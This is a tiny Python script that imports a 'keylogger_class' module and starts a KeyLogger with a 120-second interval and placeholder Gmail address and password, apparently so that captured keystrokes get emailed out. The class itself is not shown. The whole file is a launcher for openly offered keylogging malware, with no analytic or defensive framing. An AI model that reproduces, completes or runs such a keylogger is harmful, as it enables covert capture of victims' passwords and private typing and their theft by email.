#!/usr/bin/env python
# import keylogger_class.py before it works


import keylogger_class

my_keylogger = keylogger_class.KeyLogger(120, "your_email@gmail.com", "your_password")
my_keylogger.start()